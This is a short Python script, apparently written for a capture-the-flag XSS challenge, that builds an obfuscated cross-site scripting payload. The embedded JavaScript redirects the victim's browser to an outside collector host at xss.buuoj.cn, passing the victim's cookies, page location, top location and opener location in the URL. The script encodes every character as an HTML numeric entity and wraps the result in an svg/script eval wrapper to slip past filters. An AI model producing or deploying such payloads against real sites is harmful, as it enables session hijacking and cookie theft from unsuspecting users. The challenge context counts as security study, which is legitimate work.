in_str = "(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=xpqwIP&keepsession=0&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();"

output = ""

for c in in_str:
    output += "&#" + str(ord(c))

print("<svg><script>eval&#40&#34" + output + "&#34&#41</script>")